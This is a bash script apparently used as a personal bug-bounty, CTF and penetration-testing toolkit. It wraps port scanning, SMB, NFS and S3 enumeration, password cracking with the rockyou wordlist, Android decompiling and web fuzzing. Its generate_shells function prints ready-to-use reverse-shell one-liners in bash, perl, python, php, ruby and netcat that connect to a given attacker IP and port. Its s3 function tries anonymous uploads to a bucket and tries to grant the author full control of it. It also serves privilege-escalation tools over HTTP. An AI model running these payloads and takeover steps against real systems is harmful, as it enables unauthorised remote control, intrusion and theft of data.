#!/bin/bash
# shellcheck disable=SC1087,SC2181,SC2162,SC2013
###          ###
###  S0mbra  ###
###          ###


# BugBounty/CTF/PenTest/Hacking suite 
# collection of various wrappers, multi-commands, tips&tricks, shortcuts etc.
# CTX: bl4de@wearehackerone.com

HACKING_HOME="/Users/bl4de/hacking"

GREEN='\033[1;32m'
GRAY='\033[1;30m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
MAGENTA='\033[1;35m'

CLR='\033[0m'
NEWLINE='\n'


__logo="
                      :PB@Bk:
                  ,jB@@B@B@B@BBL.
               7G@B@B@BMMMMMB@B@B@Nr
           :kB@B@@@MMOMOMOMOMMMM@B@B@B1,
       :5@B@B@B@BBMMOMOMOMOMOMOMM@@@B@B@BBu.
    70@@@B@B@B@BXBBOMOMOMOMOMOMMBMPB@B@B@B@B@Nr
  G@@@BJ iB@B@@  OBMOMOMOMOMOMOM@2  B@B@B. EB@B@S
  @@BM@GJBU.  iSuB@OMOMOMOMOMOMM@OU1:  .kBLM@M@B@
  B@MMB@B       7@BBMMOMOMOMOMOBB@:       B@BMM@B
  @@@B@B         7@@@MMOMOMOMM@B@:         @@B@B@
  @@OLB.          BNB@MMOMOMM@BEB          rBjM@B
  @@  @           M  OBOMOMM@q  M          .@  @@
  @@OvB           B:u@MMOMOMMBJiB          .BvM@B
  @B@B@J         0@B@MMOMOMOMB@B@u         q@@@B@
  B@MBB@v       G@@BMMMMMMMMMMMBB@5       F@BMM@B
  @BBM@BPNi   LMEB@OMMMM@B@MMOMM@BZM7   rEqB@MBB@
  B@@@BM  B@B@B  qBMOMB@B@B@BMOMBL  B@B@B  @B@B@M
   J@@@@PB@B@B@B7G@OMBB.   ,@MMM@qLB@B@@@BqB@BBv
      iGB@,i0@M@B@MMO@E  :  M@OMM@@@B@Pii@@N:
         .   B@M@B@MMM@B@B@B@MMM@@@M@B
             @B@B.i@MBB@B@B@@BM@::B@B@
             B@@@ .B@B.:@B@ :B@B  @B@O
               :0 r@B@  B@@ .@B@: P:
                   vMB :@B@ :BO7
                       ,B@B
"


# config commands
set_ip() {
    export IP="$1"
}

interactive() {
    clear
    trap '' SIGINT SIGQUIT SIGTSTP
    set_ip "$1"
    local choice
    echo "$__logo"
    echo -e "$BLUE------------------------------------------------------------------------------------------------------"
    echo -e "Interactive mode\tTarget: $GREEN$IP$CLR"
    echo -e "$BLUE------------------------------------------------------------------------------------------------------"
    echo -e "$YELLOW[1]$CLR\t\t $GRAY-> run full nmap scan + -sV -sC on open port(s)$CLR"
    echo -e "$YELLOW[2]$CLR\t\t $GRAY-> run SMB enumeration (if port 445 is open)$CLR"
    echo -e "$YELLOW[3]$CLR\t\t $GRAY-> run nfs scan (port 2049 open)$CLR"
    echo -e "$YELLOW[4]$CLR\t\t $GRAY-> run nikto against HTTP server on port 80 with default plugins$CLR"
    echo -e ""
    echo -e "$YELLOW[0]$CLR\t\t $GRAY-> Quit"
    echo -e "$BLUE------------------------------------------------------------------------------------------------------"
    read -p ">> " choice
    case $choice in
        1) full_nmap_scan "$IP" ;;
        2) smb_enum "$IP" ;;
        3) nfs_enum "$IP" ;;
        4) nikto -host "$IP" -Plugins tests ;;
        0) exit ;;
        *) interactive "$IP"
    esac
}

# runs -p- against IP; then -sV -sC -A against every open port found
full_nmap_scan() {
    echo -e "$BLUE[+] Running full nmap scan against $1 ...$CLR"
    echo -e "\t\t -> search all open ports..."
    ports=$(nmap -p- "$1" | grep open | cut -d'/' -f 1 | tr '\n' ',')
    echo -e "\t\t -> run version detection + nse scripts against $ports..."
    nmap -p"$ports" -sV -sC -A -n "$1" -oN ./"$1".log
    echo -e "[+] Done!"
}

# runs Python 3 built-in HTTP server on [PORT]
http_server() {
    echo -e "$BLUE[+] Running Simple HTTP Server in current directory on port $1$CLR"
    python3 -m http.server "$1"
}

# runs john with rockyou.txt against hash type [FORMAT] and file [HASHES]
rockyou_john() {
    echo -e "$BLUE[+] Running john with rockyou dictionary against $1 of type $2$CLR"
    echo > "$HACKING_HOME"/tools/jtr/run/john.pot
    if [[ -n $2 ]]; then
        "$HACKING_HOME"/tools/jtr/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt "$1" --format="$2"
        elif [[ -z $2 ]]; then
        "$HACKING_HOME"/tools/jtr/run/john --wordlist="$HACKING_HOME"/dictionaries/rockyou.txt "$1"
    fi
    cat "$HACKING_HOME"/tools/jtr/run/john.pot
}

# ZIP password cracking with rockyou.txt
rockyou_zip() {
    echo -e "$BLUE[+] Running $MAGENTA zip2john $BLUE and prepare hash for hashcat..."
    "$HACKING_HOME"/tools/jtr/run/zip2john "$1" | cut -d ':' -f 2 > ./hashes.txt
    echo -e "$BLUE[+] Starting $MAGENTA hashcat $BLUE (using $YELLOW rockyou.txt $BLUE dictionary against $YELLOW hashes.txt $BLUE file)...$CLR"
    hashcat -m 13600 ./hashes.txt ~/hacking/dictionaries/rockyou.txt
}

# converts id_rsa to JTR format for cracking SSH key
ssh_to_john() {
    echo -e "$BLUE[+] Converting SSH id_rsa key to JTR format to crack it$CLR"
    python "$HACKING_HOME"/tools/jtr/run/sshng2john.py "$1" > "$1".hash
    echo -e "$BLUE[+] We have a hash.\n"
    echo -e "$BLUE[+] Let's now crack it!"
    rockyou_john "$1".hash
}

# static code analysis of npm module installed in ~/node_modules
# with nodestructor and semgrep
npm_scan() {
    echo -e "$BLUE[+] Starting static code analysis of $1 module with nodestructor and semgrep...$CLR"
    nodestructor -r ~/node_modules/"$1" --verbose --skip-test-files
    semgrep --lang javascript --config "$HACKING_HOME"/tools/semgrep-rules/contrib/nodejsscan/ "$HOME"/node_modules/"$1"/*.js
    exitcode=$(ls "$HOME"/node_modules/"$1"/*/ >/dev/null 2>&1)
    if [ "$exitcode" == 0 ]; then
        semgrep --lang javascript --config "$HACKING_HOME"/tools/semgrep-rules/contrib/nodejsscan/ "$HOME"/node_modules/"$1"/**/*.js
    fi
    echo -e "\n\n[+]Done."
}


# static code analysis of single JavaScript code
javascript_sca() {
    echo -e "$BLUE[+] Starting static code analysis of $1 file with nodestructor and semgrep...$CLR"
    nodestructor --include-browser-patterns --include-urls "$1"
    echo -e "\n\n[+]Done."
}

# exposes folder with Linux PrivEsc tools on localhost:9119
privesc_tools_linux() {
    cd "$HACKING_HOME"/tools/Linux-tools || exit
    echo -e "$BLUE[+] Available tools:$CLR"
    tree -L 2 .
    echo -e "$BLUE[+] Starting HTTP server on port 9119...$CLR"
    http_server 9119
}


# exposes folder with Windows PrivEsc tools on localhost:9119
privesc_tools_windows() {
    cd "$HACKING_HOME"/tools/Windows || exit
    echo -e "$BLUE[+] Available tools:$CLR"
    ls -lR .
    echo -e "$BLUE[+] Starting HTTP server on port 9119...$CLR"
    http_server 9119
}

# enumerates SMB shares on [IP] - port 445 has to be open
smb_enum() {
    if [[ -z $2 ]]; then
        username='NULL'
    elif [[ -n $2 ]]; then
        username="$2"
    fi

    if [[ -z $3 ]]; then
        password=''
    elif [[ -n $3 ]]; then
        password="$3"
    fi

    echo -e "$BLUE[+] Enumerating SMB shares with nmap on $1...$CLR"
    nmap -Pn -p445 --script=smb-enum-shares.nse,smb-enum-users.nse "$1"
    echo -e "$YELLOW\n[+] smbmap -u $username -p $password against\t\t -> $1...$CLR"
    smbmap -H "$1" -u "$username" -p "$password" 2>&1 | tee __disks
    for d in $(grep 'READ' __disks | cut -d' ' -f 1); do
        echo -e "$YELLOW\n[+] content of $d directory saved to $1__shares_listings $CLR"
        smbmap -H "$IP" -u "$username" -p "$password" -R "$d" >> "$1"__shares_listings
    done
    rm -f __disks
    echo -e "\n[+] Done."
}

# download file from SMB share
smb_get_file() {
    if [[ -z $2 ]]; then
        username='NULL'
    elif [[ -n $2 ]]; then
        username="$2"
    fi

    if [[ -z $3 ]]; then
        password=''
    elif [[ -n $3 ]]; then
        password="$3"
    fi

    echo -e "$BLUE[+] Downloading file $4 from $1...$CLR"
    echo -e "$GREEN"
    smbmap -H "$1" -u "$2" -p "$3" --download "$4"
    echo -e "$CLR"
    echo -e "\n[+] Done."
}

# mounts SMB share at ./mnt/shares
smb_mount() {
    echo -e "$BLUE[+] Mounting SMB $2 share from $1 at ./mnt/shares...$CLR"
    mkdir -p mnt/shares
    echo "//$3@$1/$2"
    mount_smbfs "//$3@$1/$2" ./mnt/shares
    echo -e "$YELLOW\n[+] Locally available shares:\n.$CLR"
    ls -l ./mnt/shares
    echo -e "\n[+] Done."
}

# umounts from ./mnt/shares and delete it
smb_umount() {
    echo -e "$BLUE[+] Unmounting SMB share(s) from ./mnt/shares...$CLR"
    umount ./mnt/shares
    rm -rf ./mnt
    echo -e "\n[+] Done."
}

# if RPC on port 111 shows in rpcinfo that nfs on port 2049 is available
# we can enumerate nfs shares available:
nfs_enum() {
    echo -e "$BLUE[+] Enumerating nfs shares (TCP 2049) on $1...$CLR"
    nmap -Pn -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount "$1"
    echo -e "\n[+] Done."
}


# if RPC on port 111 shows in rpcinfo that nfs on port 2049 is available
# we can enumerate nfs shares available:
subdomenum() {
    echo -e "$BLUE[+] Running subdomain enumeration and HTTP(S) web servers discovery on $1 scope file..."
    enumeratescope $1 $2
    echo -e "\n[+] Done."
}


# checking AWS S3 bucket
s3() {
    echo -e "$BLUE[+] Checking AWS S3 $1 bucket$CLR"
    aws s3 ls "s3://$1" --no-sign-request 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ content of the bucket can be listed!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- could not list the content... :/$CLR"
    fi

    touch test.txt
    echo 'TEST' >> test.txt
    aws s3 cp test.txt "s3://$1/test.txt" --no-sign-request 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ WOW!!! We can copy files to the bucket!!! PWNed!!!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- nope, cp does not work... :/$CLR"
    fi
    rm -f test.txt

    declare -a s3api=(
        "get-bucket-acl" 
        "put-bucket-acl" 
        "get-bucket-website" 
        "get-bucket-cors"
        "get-bucket-lifecycle-configuration" 
        "get-bucket-policy" 
        "list-bucket-metrics-configurations"
        "list-multipart-uploads" 
        "list-object-versions" 
        "list-objects"
    )
    for cmd in "${s3api[@]}"; do
        echo -e "---------------------------------------------------------------------------------"
        aws s3api "$cmd" --bucket "$1" --no-sign-request 2> /dev/null
        if [[ "$?" == 0 ]]; then
            echo -e "\n\n$GREEN+  $cmd works!$CLR\n"
            aws s3api "$cmd" --bucket "$1" --no-sign-request 2> /dev/null
        elif [[ "$?" != 0 ]]; then
            echo -e "\n$RED- nope, $cmd does not seem to be working... :/$CLR"
        fi
    done

    aws s3api put-bucket-acl --bucket "$1" --grant-full-control emailaddress=bl4de@wearehackerone.com 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+  We can grant full control!!! PWNed!!!$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- nope, can't grant control with --grant-full-control ... :/$CLR"
    fi
    echo -e "\n[+] Done."
}

s3go() {
    clear
    echo -e "$BLUE[+] Getting $2 from $1 bucket...$CLR"

    aws s3api get-object-acl --bucket "$1" --key "$2" 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ We can read ACL of $3$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- can't check $2 ACL... :/$CLR"
    fi

    aws s3api get-object --bucket "$1" --key "$2" "$1".downloaded 2> /dev/null
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+  $2 downloaded in current directory as $2.downloaded$CLR"
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- can't get $2 :/$CLR"
    fi
}

dex_to_jar() {
    clear
    echo -e "$BLUE[+] Exporting $1 into .jar...$CLR"
    d2j-dex2jar  --force $1
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ Ok, we have JAR, now opening it in JD-Gui...$CLR"
        DEX_FILENAME=$(echo "$1"| cut -d'.' -f 1)
        java -jar /Users/bl4de/hacking/tools/Java_Decompilers/jd-gui-1.6.3.jar "$DEX_FILENAME"-dex2jar.jar
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- there was an error and .jar file probably was not created :/... :/$CLR"
    fi
}

decompile_jar() {
    clear
    echo -e "$BLUE[+] Opening $1 in JD-Gui...$CLR"
    java -jar /Users/bl4de/hacking/tools/Java_Decompilers/jd-gui-1.6.3.jar $1
}

jadx() {
    clear
    echo -e "$BLUE[+] Opening $1 in JADX...$CLR"
    /Users/bl4de/hacking/tools/Java_Decompilers/jadx/bin/jadx-gui $1
}

apk() {
    clear
    echo -e "$BLUE[+] OK, let's see this APK...$CLR"
    unzip $1
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN+ Unizpped, now run apktool on it...$CLR"
        apktool d $1
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- unzipping .apk failed :/... :/$CLR"
    fi
}

abe() {
    clear
    echo -e "$BLUE[+] Extracting $1.ab backup into $1.tar...$CLR"
    java -jar /Users/bl4de/hacking/tools/Java_Decompilers/android-backup-extractor/build/libs/abe.jar unpack $1.ab $1.tar
    if [[ "$?" == 0 ]]; then
        echo -e "\n$GREEN[+] Success! $1.ab unpacked and $1.tar was created..."
        echo -e "[+] Let's untar some files, shall we?$CLR"
        rm -rf $1_extracted && mkdir ./$1_extracted
        tar -xf $1.tar -C $1_extracted
        echo -e "\n$GREEN[+] tar extracted, folder(s) created:$CLR"
        ls -l $1_extracted
    elif [[ "$?" != 0 ]]; then
        echo -e "\n$RED- Damn... :/$CLR"
    fi
}

fu() {
    clear
    echo -e "$BLUE[+] Enumerate web resources on $1 with $2.txt dictionary; matching only HTTP 200 and 500...$CLR"
    ffuf -c -w /Users/bl4de/hacking/dictionaries/$2.txt -u $1/FUZZ -mc 200,500
}

generate_shells() {
    clear
    port=$2

    echo -e "$BLUE[+] OK, here are your shellz...\n$CLR"

    echo -e "\033[41m[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
    echo -e "\033[41m[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
    echo -e "\033[41m[bash]\033[0m exec 5<>/dev/tcp/$1/$port | cat <&5 | while read line; do $line 2>&5 >&5; done"
    echo -e "$NEWLINE"
    echo -e "\033[42m[perl]\033[0m perl -e 'use Socket;\$i=\"$1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo -e "\033[42m[perl]\033[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo -e "\033[42m[perl (Windows)]\033[0m perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
    echo -e "$NEWLINE"
    echo -e "\033[43m[python]\033[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\033[0m);'"
    echo -e "$NEWLINE"
    echo -e "\033[44m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
    echo -e "$NEWLINE"
    echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo -e "$NEWLINE"
    echo -e "\033[46m[netcat]\033[0m nc -e /bin/sh $1 $port"
    echo -e "\033[46m[netcat]\033[0m nc -c /bin/sh $1 $port"
    echo -e "\033[46m[netcat]\033[0m /bin/sh | nc $1 $port"
    echo -e "\033[46m[netcat]\033[0m rm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
    echo -e "\033[46m[netcat]\033[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
    echo -e "$NEWLINE"
}

php7() {
    echo -e "$BLUE[+] Switching PHP version to 7.x ...\n$YELLOW"
    brew unlink php@8.0 && brew link --force php@7.4
    echo -e "$BLUE[+] Changing httpd.conf...$YELLOW"
    sudo cp /private/etc/apache2/httpd.conf.php7 /private/etc/apache2/httpd.conf
    echo -e "$BLUE[+] Restarting Apache...$YELLOW"
    sudo apachectl -k restart
    echo -e "$BLUE[+] All done, current PHP version is:\n$GREEN"
    php -v
    echo -e "$CLR"
}

php8() {
    echo -e "$BLUE[+] Switching PHP version to 8.x ...\n$YELLOW"
    brew unlink php@7.4 && brew link --force php@8.0
    echo -e "$BLUE[+] Changing httpd.conf...$YELLOW"
    sudo cp /private/etc/apache2/httpd.conf.php8 /private/etc/apache2/httpd.conf
    echo -e "$BLUE[+] Restarting Apache...$YELLOW"
    sudo apachectl -k restart
    echo -e "$BLUE[+] All done, current PHP version is:\n$GREEN"
    php -v
    echo -e "$CLR"
}


cmd=$1
clear
echo "$__logo"
case "$cmd" in
    php7)
        php7
    ;;
    php8)
        php8
    ;;
    set_ip)
        set_ip "$2"
    ;;
    subdomenum)
        subdomenum "$2" "$3"
    ;;
    full_nmap_scan)
        full_nmap_scan "$2"
    ;;
    http_server)
        http_server "$2"
    ;;
    rockyou_john)
        rockyou_john "$2" "$3"
    ;;
    rockyou_zip)
        rockyou_zip "$2"
    ;;
    ssh_to_john)
        ssh_to_john "$2"
    ;;
    npm_scan)
        npm_scan "$2"
    ;;
    javascript_sca)
        javascript_sca "$2"
    ;;
    dex_to_jar)
        dex_to_jar "$2"
    ;;
    jadx)
        jadx "$2"
    ;;
    apk)
        apk "$2"
    ;;
    abe)
        abe "$2"
    ;;
    decompile_jar)
        decompile_jar "$2"
    ;;
    privesc_tools_linux)
        privesc_tools_linux
    ;;
    privesc_tools_windows)
        privesc_tools_windows
    ;;
    smb_enum)
        smb_enum "$2" "$3" "$4"
    ;;
    smb_get_file)
        smb_get_file "$2" "$3" "$4" "$5"
    ;;
    smb_mount)
        smb_mount "$2" "$3" "$4"
    ;;
    smb_umount)
        smb_umount
    ;;
    nfs_enum)
        nfs_enum "$2"
    ;;
    s3)
        s3 "$2"
    ;;
    fu)
        fu "$2" "$3"
    ;;
    s3go)
        s3go "$2" "$3"
    ;;
    generate_shells)
        generate_shells "$2" "$3"
    ;;
    interactive)
        interactive "$2"
    ;;
    *)
        clear
        echo -e "$GREEN I'm guessing there's no chance we can take care of this quietly, is there? - S0mbra$CLR"
        echo -e "--------------------------------------------------------------------------------------------------------------"
        echo -e "Usage:\t$YELLOW s0mbra.sh {cmd} {arg1} {arg2}...{argN}"
        echo -e "\t s0mbra.sh interactive {IP} (interactive mode)$CLR"  # interactive\t\t -> TBD
        echo -e "\n$BLUE:: COMMANDS IN INTERACTIVE MODE ::$CLR"
        echo -e "\tset_ip [IP]\t\t\t\t\t -> sets IP in current Bash session to use by other s0mbra commands"
        echo -e "$BLUE:: RECON ::$CLR"
        echo -e "\tsubdomenum [SCOPE_FILE] [OUTPUT_DIR]\t\t -> full scope subdomain enumeration + HTTP(S) denumerator on all identified domains"
        echo -e "\tfull_nmap_scan [IP]\t\t\t\t -> nmap -p- to enumerate ports + -sV -sC -A on found open ports"
        echo -e "\tnfs_enum [IP]\t\t\t\t\t -> enumerates nfs shares on [IP] (2049 port has to be open/listed in rpcinfo)"
        echo -e "$BLUE:: AMAZON AWS S3 ::$CLR"
        echo -e "\ts3 [bucket]\t\t\t\t\t -> checks privileges on AWS S3 bucket (ls, cp, mv etc.)"
        echo -e "\ts3go [bucket] [key]\t\t\t\t -> get object identified by [key] from AWS S3 [bucket]"
        echo -e "$BLUE:: PENTEST TOOLS ::$CLR"
        echo -e "\thttp_server [PORT]\t\t\t\t -> runs HTTP server on [PORT] TCP port"
        echo -e "\tprivesc_tools_linux \t\t\t\t -> runs HTTP server on port 9119 in directory with Linux PrivEsc tools"
        echo -e "\tprivesc_tools_windows \t\t\t\t -> runs HTTP server on port 9119 in directory with Windows PrivEsc tools"
        echo -e "\tgenerate_shells [IP] [PORT] \t\t\t -> generates ready-to-use reverse shells in various languages for given IP:PORT"
        echo -e "$BLUE:: SMB SUITE ::$CLR"
        echo -e "\tsmb_enum [IP] [USER] [PASSWORD]\t\t\t -> enumerates SMB shares on [IP] as [USER] (eg. null) (445 port has to be open)"
        echo -e "\tsmb_get_file [IP] [user] [password] [PATH] \t -> downloads file from SMB share [PATH] on [IP]"
        echo -e "\tsmb_mount [IP] [SHARE] [USER]\t\t\t -> mounts SMB share at ./mnt/shares"
        echo -e "\tsmb_umount\t\t\t\t\t -> unmounts SMB share from ./mnt/shares and deletes it"
        echo -e "$BLUE:: PASSWORDS CRACKIN' ::$CLR"
        echo -e "\trockyou_john [TYPE] [HASHES]\t\t\t -> runs john+rockyou against [HASHES] file with hashes of type [TYPE]"
        echo -e "\tssh_to_john [ID_RSA]\t\t\t\t -> id_rsa to JTR SSH hash file for SSH key password cracking"
        echo -e "\trockyou_zip [ZIP file]\t\t\t\t -> crack ZIP password"
        echo -e "$BLUE:: STATIC CODE ANALYSIS ::$CLR"
        echo -e "\t$YELLOW(JavaScript)$CLR\tnpm_scan [MODULE_NAME]\t\t -> static code analysis of MODULE_NAME npm module with nodestructor"
        echo -e "\t$YELLOW(JavaScript)$CLR\tjavascript_sca [FILE_NAME]\t -> static code analysis of single JavaScript file with nodestructor"
        echo -e "\t$YELLOW(Java)$CLR\t\tdecompile_jar [.jar FILE]\t -> open FILE.jar file in JD-Gui"
        echo -e "$BLUE:: ANDROID ::$CLR"
        echo -e "\t$YELLOW(Java)$CLR\t\tjadx [.apk FILE]\t\t -> open FILE.apk file in JADX GUI"
        echo -e "\tdex_to_jar [.dex file]\t\t\t\t -> exports .dex file into .jar and open it in JD-Gui"
        echo -e "\tapk [.apk FILE]\t\t\t\t\t -> extracts APK file and run apktool on it"
        echo -e "\tabe [.ab FILE]\t\t\t\t\t -> extracts Android .ab backup file into .tar (with android-backup-extractor)"
        echo -e "$BLUE:: WEB ::$CLR"
        echo -e "\tfu [URL] [DICT]\t\t\t\t\t -> web application enumeration (DICT: starter, lowercase, wordlist)"
        echo -e "$BLUE:: MISC ::$CLR"
        echo -e "\tphp7 \t\t\t\t\t\t -> switch PHP to version 7.x"
        echo -e "\tphp8 \t\t\t\t\t\t -> switch PHP to version 8.x"
        echo -e "\n\n--------------------------------------------------------------------------------------------------------------"
        echo -e "$GREEN Hack The Planet!\n$CLR"
    ;;
esac
